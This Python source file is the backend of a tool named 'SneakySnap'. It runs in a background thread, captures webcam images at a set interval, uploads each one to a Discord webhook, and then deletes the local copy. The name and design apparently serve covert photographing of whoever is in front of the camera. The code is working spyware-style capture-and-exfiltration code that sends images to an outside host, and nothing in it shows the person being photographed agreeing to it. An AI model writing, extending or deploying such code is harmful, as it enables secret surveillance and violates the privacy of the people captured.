import cv2
import requests
import time
import os
import threading
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    filename="SneakySnap.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

class SneakySnapBackend:
    def __init__(self, log_callback):
        self.running = False
        self.cam = None
        self.log_callback = log_callback
        self.delay = 5  # Default delay in seconds
        self.webhook_url = None
        self.log("Backend initialized.")

    def log(self, message, level="INFO"):
        """Log a message to file and GUI."""
        log_entry = f"{message}"
        if level == "INFO":
            logging.info(log_entry)
        elif level == "ERROR":
            logging.error(log_entry)
        self.log_callback(log_entry)

    def test_webhook(self, webhook_url):
        """Test if the webhook URL is functional."""
        try:
            response = requests.post(webhook_url, data={"content": "Test message from SneakySnap"})
            if response.status_code == 204:
                self.webhook_url = webhook_url
                self.log("Webhook test passed successfully.")
                return True
            else:
                self.log(f"Webhook test failed: {response.status_code} - {response.text}", "ERROR")
                return False
        except Exception as e:
            self.log(f"Webhook test failed due to error: {str(e)}", "ERROR")
            return False

    def set_delay(self, delay):
        """Set the delay between captures."""
        self.delay = delay

    def capture_loop(self, webhook_url):
        """Main loop for capturing and sending photos."""
        while self.running:
            if not self.cam or not self.cam.isOpened():
                self.log("Webcam unavailable or not initialized.", "ERROR")
                self.stop_capture()
                return

            # Capture frame
            ret, frame = self.cam.read()
            if not ret:
                self.log("Failed to capture image from webcam.", "ERROR")
                self.stop_capture()
                return

            photo_path = "snapshot_temp.jpg"
            cv2.imwrite(photo_path, frame)
            self.log(f"Image captured successfully at {datetime.now().strftime('%H:%M:%S')}.")

            # Send to webhook
            try:
                with open(photo_path, "rb") as f:
                    files = {"file": (photo_path, f, "image/jpeg")}
                    data = {"content": "Photo captured and sent."}
                    response = requests.post(webhook_url, data=data, files=files)
                    if response.status_code == 204:
                        self.log("Image successfully sent to Discord webhook.")
                    else:
                        self.log(f"Webhook request failed: {response.status_code} - {response.text}", "ERROR")
            except Exception as e:
                self.log(f"Error sending to webhook: {str(e)}", "ERROR")

            # Cleanup
            if os.path.exists(photo_path):
                os.remove(photo_path)
                self.log("Temporary image file removed.")

            # Delay between captures
            time.sleep(self.delay)

    def start_capture(self, webhook_url):
        """Start the capture process with provided webhook."""
        if not self.running:
            if not webhook_url:
                self.log("No webhook URL provided.", "ERROR")
                return
            self.webhook_url = webhook_url
            self.running = True
            self.log(f"Starting capture with {self.delay}-second delay.")
            self.cam = cv2.VideoCapture(0)
            if not self.cam.isOpened():
                self.log("Webcam not detected or accessible.", "ERROR")
                self.running = False
                return

            self.capture_thread = threading.Thread(target=self.capture_loop, args=(webhook_url,))
            self.capture_thread.daemon = True
            self.capture_thread.start()

    def stop_capture(self):
        """Stop the capture process."""
        if self.running:
            self.running = False
            if self.cam:
                self.cam.release()
                self.log("Webcam released and capture stopped.")
            else:
                self.log("Capture stopped.")